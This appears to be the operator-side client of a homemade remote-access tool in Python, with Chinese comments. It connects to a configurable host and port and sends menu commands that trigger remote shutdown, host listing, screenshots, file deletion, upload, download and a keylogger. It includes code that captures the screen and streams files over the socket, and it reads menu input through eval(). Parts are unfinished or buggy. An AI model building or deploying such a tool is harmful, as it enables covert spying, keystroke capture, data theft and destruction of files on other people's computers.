import socket,pyautogui,time,os,struct
#创建套接字、建立连接
#def client_service():
try:
        client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        #填写外网IP和端口
        serveraddr = ("127.0.0.1",1444)
        client.connect(serveraddr)
        
except socket.error as e:
        pass

#截图并发送
def screenshot(client):
    cout = 0
    #截图
    while cout < 1:
    	#使用pyautogui库函数截图
        img = pyautogui.screenshot()
        cout += 1
        img.save("screenshot_{}.jpg".format(cout))
        time.sleep(3)
        
        
def sendfile(client):
        cout=1
        #分包传输文件，包两端对称
        filepath = "screenshot_{}.jpg".format(cout)
        if os.path.isfile(filepath):
            #判断截图是否存在
            #每个包大小128bytes
            fileinfopck = struct.pack("128sl",bytes(os.path.basename(filepath).encode("utf-8")),os.stat(filepath).st_size)
            client.send(fileinfopck)
            #数据分段发送
            fileobj = open(filepath,"rb")
            while True:
                sendfiledata = fileobj.read(1024)
                if not sendfiledata:
                    print("{}文件发送完毕".format(filepath))
                    break
                client.send(sendfiledata)

if __name__ == "__main__":

    print("1输出字符串，2关机&取消关机，3取消关机，4获取主机列表 ")
    print("5截屏，6删除文件，7上传，8下载")
    print("补充功能9键盘记录器")
    a=eval(input("输入数字，选择对应功能"))
    print("每次只选其中一个，如需更换需要关闭终端重新进入选择")
    if a==1:
        
        print("输出字符串：1")
        message1 = "1".encode("utf-8")
        client.send(message1)
    if a==2:
        print("如果仍要选择关机，输入0，60秒后服务器端关闭")
        print("如果取消关机 ，输入1，服务器端继续运行")
        b=eval(input("输入数字，选择对应功能"))
        if b==0:
        	message1 = "2".encode("utf-8")
        	client.send(message1)
        	print("60s关机")
        	time.sleep(1)
        	exit()
        if b==1:
        	message1 = "3".encode("utf-8")
        	client.send(message1)
        	print("取消关机")
    if a==3:
        	message1 = "3".encode("utf-8")
        	client.send(message1)
        	print("取消关机")
    
    if a==4:
        message1 = "4".encode("utf-8")
        client.send(message1)
        print("获取主机列表")
        
        
    if a==5:
        message1 = "5".encode("utf-8")
        client.send(message1)
        print("截屏")
        #client_service()
        #client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        #截图
        screenshot(client)
        
        
    if a==6:
        message1 = "6".encode("utf-8")
        client.send(message1)
        print("删除文件")
        #清除图片
        #for i in range(1, 4):
        #os.remove("screenshot_{}.jpg".format(1))
        
    if a==7:
        #截图发送至Server
        message1 = "7".encode("utf-8")
        client.send(message1)
        print("上传")
        #sendfile(client)
    
    if a==8:
        message1 = "8".encode("utf-8")
        client.send(message1)
        print("下载")
        
    if a==9:
        message1 = "9".encode("utf-8")
        client.send(message1)
        print("补充功能9键盘记录器")


